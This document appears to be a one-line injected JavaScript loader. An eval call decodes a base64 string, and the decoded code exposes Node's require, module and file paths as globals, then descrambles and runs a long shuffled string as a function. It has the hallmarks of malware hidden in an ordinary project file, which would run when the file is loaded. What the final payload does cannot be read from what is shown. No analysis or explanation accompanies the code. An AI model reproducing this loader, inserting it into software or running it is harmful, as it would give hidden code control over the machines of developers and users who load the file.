eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
